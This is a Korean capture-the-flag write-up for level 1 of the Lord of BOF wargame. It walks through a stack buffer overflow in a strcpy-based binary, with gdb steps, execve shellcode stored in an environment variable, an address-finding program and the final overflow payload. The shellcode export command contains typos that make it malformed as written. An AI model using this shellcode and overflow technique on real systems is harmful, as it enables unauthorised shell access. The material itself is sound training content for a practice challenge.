# LOB 1번

#### ID : gate PW: gate<br>
**먼저 bash2에서 실행해야함을 기억하자** <br>

우선 gremlin.c의 내용을 보자<br>
```cat gremlin.c```<br>
```c
#include <stdio.h>

int main(int argc, char *argv[1])
{
      char buffer[256];
      if (argc < 2){
        printf("argv error\n");
        exit(0);
      }
      strcpy(buffer, argv[1]);
      printf("%s\n", buffer);
}
```
버퍼로 256byte를 입력받을 수 있고 argc가 2개 미만이면 오류를 출력하고 프로그램을 종료시킨다.<br>
2개 이상이라면 buffer에 argv[1] 인자를 복사하고 출력한다.<br>
이 문제는 strcpy 함수를 실행할 때 정해진 복사할 크기가 없다는 취약점을 이용한 것이다<br>

우리의 목적을 생각해보자.<br>
1. buffer 위치 구하기
2. 환경변수 등록 후 주소 얻기
3. ret에 환경변수 주소 덮어씌우기
3. 공격!

**gremlin 코드를 디버깅해야하기 때문에 gremlin1로 복사하자.**<br>

**그리고 디버깅을 해보자**<br>
```gdb -q gremlin1```<br>
```set disassembly-flavor intel```<br>
```disas main```<br>

<main+3>을 보면 0x100만큼의 공간을 만들고 있다. 0x100은 10진수로 256이다.<br>
buffer에서 ebp까지의 거리가 256이라는 것이다.<br>

25byte 쉘코드를 등록해준 후 주소값을 얻는 코드를 통해 주소값을 얻자.<br>
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80<br>

```export shellcode=$(python -c 'print "\n90"*20+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')```<br>
vi에디터를 이용해 쉘 코드의 주소값을 받아오는 코드를 작성한다.<br>
```vi shell.c```<br>
```c
#include <stdio.h>

int main()
{
    printf("%p\n", getenv("shellcode"));
    return 0;
}
```
```
gcc -o shell shell.c
./shell
```
만든 코드를 실행시키면 쉘 코드의 주소값을 알 수 있다.<br>

**이제 페이로드를 작성해보자.**<br>
```../gremlin `python -c 'print "A"*260+"\x25\xfd\xff\xbf"'` ```<br>
*(주소는 little endian 방식으로 입력된다)*<br>
<br>
**공격 실시!**<br>
```../gremlin `python -c 'print "A"*260+"\x25\xfd\xff\xbf"'` ```<br>
```my-pass```로 비밀번호를 물어보면<br>
euid와 함께 비밀번호가 "~~". 라고 나올 것이다!!
